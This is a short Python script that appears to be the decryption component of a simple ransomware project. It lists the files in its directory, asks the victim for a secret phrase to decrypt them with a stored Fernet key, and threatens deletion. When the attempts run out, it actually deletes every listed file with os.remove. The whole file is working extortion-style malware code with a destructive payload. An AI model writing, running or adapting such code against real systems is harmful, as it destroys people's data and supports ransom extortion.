#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#find files

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "decrypt2.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()
	
# This is the phrase that will decrypt files
secretphrase = "xxx"

# Input prompt
user_phrase = input('Enter the secret phrase to decrypt your files. You have 5 attempts before your files are deleted.\n')

i = 5

while i > 1:	
	if user_phrase == secretphrase:
		for file in files:
			with open(file, "rb") as thefile:
				contents = thefile.read()
			contents_decrypted = Fernet(secretkey).decrypt(contents)
			with open(file, "wb") as thefile:
				thefile.write(contents_decrypted)
		print("Congratulations! Your files are decrypted.")
		exit()
	else:
		i -= 1
		prompt = f'Wrong. {i} attempts remaining.\n'
	user_phrase = input(prompt)
	
print("Game Over. Your files will now be deleted.")

# Delete the files
for file in files:
	os.remove(file)
		
